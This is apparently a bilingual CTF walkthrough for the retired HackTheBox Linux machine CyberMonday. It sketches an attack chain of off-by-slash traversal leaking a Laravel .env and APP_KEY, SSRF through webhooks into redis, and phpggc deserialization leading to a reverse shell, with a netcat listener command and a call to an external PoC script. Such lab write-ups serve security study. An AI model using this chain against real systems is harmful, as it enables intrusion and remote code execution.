# CyberMonday [HARD]

> **ES:** Máquina Hard Linux (maker Tr1s0n): off-by-slash (.env expuesto), mass assignment, SSRF (webhooks → redis) y deserialización Laravel vía APP_KEY filtrada (phpggc RCE10). PoC local en esta carpeta.
> **EN:** Hard Linux machine (by Tr1s0n): off-by-slash (exposed .env), mass assignment, SSRF (webhooks → redis) and Laravel deserialization via leaked APP_KEY (phpggc RCE10). Local PoC in this folder.

| Campo | Valor |
|-------|-------|
| **Dificultad / Difficulty** | Hard |
| **OS** | Linux |
| **Estado / Status** | Retired (19-ago-2023) |
| **Maker** | Tr1s0n |
| **URL** | https://app.hackthebox.com/machines/CyberMonday |

## 📂 Opciones de solución en esta carpeta / Solution options in this folder

| # | Opción / Option | Archivo / File |
|---|-----------------|----------------|
| 1 | Síntesis ES/EN (este archivo) | `Walkthrough.md` |
| 2 | PoC Laravel → redis → RCE | `HTB_Cybermonday_poc.py` ([saoGITo/HTB_Cybermonday](https://github.com/saoGITo/HTB_Cybermonday), acceso 2026-09-25) |
| 3 | Video | IppSec ([ver en índice](https://ippsec.rocks/)) |

## 🎯 Objetivo / Objective

> **ES:** `user.txt` y `root.txt` vía web Laravel + SSRF a redis, y escalada posterior (pendiente de detallar).
> **EN:** `user.txt` and `root.txt` via Laravel web + SSRF to redis, then privesc (pending detail).

## 🛠️ Herramientas / Tools

- `nmap`, `feroxbuster`, `phpggc`, `nc`, `python3` (`requests`, `pycryptodome`, `phpserialize`)

## 📝 Pasos / Steps

### 1. Reconocimiento / Recon

```bash
echo "10.10.11.228 cybermonday.htb" | sudo tee -a /etc/hosts
echo "10.10.11.228 webhooks-api-beta.cybermonday.htb" | sudo tee -a /etc/hosts
apt install phpggc
nc -nvlp 4444
```

### 2. Off-by-slash → .env → APP_KEY / Off-by-slash to .env

> **ES:** `GET /assets../.env` (off-by-slash) expone el `.env` con `APP_KEY` de Laravel.
> **EN:** `GET /assets../.env` (off-by-slash) exposes Laravel's `.env` with `APP_KEY`.

### 3. Mass assignment + SSRF → redis → RCE / SSRF to redis

> **ES:** Crear webhook (JWT de test en `x-access-token`), apuntarlo a `redis:6379` con `SET laravel_session:<sesión> <payload phpggc RCE10>`; al cargar `/home` con la sesión, deserializa y ejecuta el reverse shell.
> **EN:** Create webhook (test JWT in `x-access-token`), point it at `redis:6379` with `SET laravel_session:<session> <phpggc RCE10 payload>`; loading `/home` with the session deserializes and runs the reverse shell.

```bash
python3 HTB_Cybermonday_poc.py <TU_IP> 4444
```

**Resultado / Result:** reverse shell → `user.txt`.

### 4. Root — pendiente de documentar / pending documentation

## 📚 Fuentes / Sources

- Sinopsis oficial: [Cybermonday (Hard) — HTB](https://www.hackthebox.com/machines/cybermonday) — Tr1s0n — acceso 2026-09-25
- PoC: [saoGITo/HTB_Cybermonday](https://github.com/saoGITo/HTB_Cybermonday) — saoGITo — acceso 2026-09-25
- Video: IppSec (`VNMn5bXA8XY`) vía [dataset](https://ippsec.rocks/) — acceso 2026-09-24
- Autor notas: Apuromafo

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de contenido activo.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish active content flags.

_Fecha de edición: 2026-09-25_
